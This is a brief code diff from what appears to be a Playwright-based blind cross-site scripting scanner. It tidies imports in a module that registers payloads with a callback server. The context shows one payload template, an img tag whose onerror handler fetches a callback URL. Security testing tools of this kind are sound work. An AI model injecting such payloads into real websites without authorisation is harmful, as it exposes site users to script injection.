@@ -6,10 +6,11 @@ from dataclasses import dataclass
 from enum import Enum, auto
 from typing import Any, Dict, Iterable, Iterator, List, Optional, Set, Tuple
 
-from playwright.sync_api import Browser, Locator, Page, TimeoutError as PlaywrightTimeoutError
+from playwright.sync_api import Browser, Locator, Page
+from playwright.sync_api import TimeoutError as PlaywrightTimeoutError
 
 from ...callback.server import register_payload, tracker
-from ...core.models import FieldAttributes, FieldInfo
+from ...core.models import FieldAttributes
 
 PAYLOAD_TEMPLATES = (
     "<img src=x onerror=fetch('{url}')>",
